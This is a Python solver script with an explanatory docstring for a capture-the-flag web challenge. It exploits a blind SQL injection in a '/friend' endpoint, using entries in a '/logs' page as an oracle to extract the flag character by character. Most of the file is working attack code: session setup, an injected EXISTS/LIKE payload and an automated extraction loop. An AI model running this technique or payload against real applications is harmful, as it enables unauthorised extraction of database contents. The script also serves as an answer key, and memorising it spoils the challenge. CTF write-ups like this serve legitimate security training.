"""Challenge: Error Reporting  
Attack: Blind SQL Injection via logs side channel

By reviewing the provided code, you’ll notice that the app exposes a `/logs` endpoint which displays application logs. There's also an apparent SQL injection vulnerability in the `/friend` (friend request) endpoint. However, this is a blind injection (the HTTP response is always the same), making boolean-based approaches ineffective.

Time-based extraction might come to mind, but the reverse proxy (NGINX) in front of the Flask app has a timeout, which makes that approach unreliable.

However, take a closer look at the logging behavior in the `/friend` endpoint:
```python
print(f"...Sending friend request to user {user[0]}")

log_per_user(session['username'], f'Friend request sent')
```
This log line is only triggered if the user exists and the query returns a row, because if there is no row, the expression `user[0]` will raise an Exception.

Now, you check one char at a time, and then check if a log was inserted in /logs or not, this becomes a simple error-based SQL injection challenge.
"""
import sys
import requests
import string

url = sys.argv[1]

chars = string.ascii_lowercase + string.digits + '_{}'

s = requests.Session()

flag = "ASU{" # known prefix

def login(username, password):
    r = s.post(f"{url}/login", headers={
        'Content-Type': 'application/x-www-form-urlencoded'
    }, data={
        'username': username,
        'password': password,
    })
    assert r.status_code == 200
    return r

def register(username, password):
    r = s.post(f"{url}/register", headers={
        'Content-Type': 'application/x-www-form-urlencoded'
    }, data={
        'username': username,
        'password': password,
    })
    assert r.status_code == 200
    return r

def friend_request(username):
    r = s.post(f"{url}/friend", headers={
        'Content-Type': 'application/x-www-form-urlencoded'
    }, data={
        'username': username,
    })
    assert r.status_code == 200
    return r

def logs() -> str:
    r = s.get(f"{url}/logs")
    return r.text

my_username = 'hyper'
# create an account so that you can view the logs
register(my_username, '1234')
login(my_username, '1234')

count_success_logs = logs().count('Friend request')

print(count_success_logs)
while True:
    for c in chars:
        attempt = flag + c
        print("\033[2J\033[H")
        print(attempt)
        # have a unique string in the username so that you can check the logs for this attempt
        # you can also use the "attempt" as an ID, but then other players would see the flag, so don't.
        r = friend_request(f"{my_username}' AND EXISTS(SELECT 1 FROM users WHERE username LIKE '{attempt.replace('_', r'\_')}%' ESCAPE '\\') --")
        if logs().count('Friend request') > count_success_logs:
            count_success_logs += 1
            flag += c
            if c == '}':
                exit(1)
            break
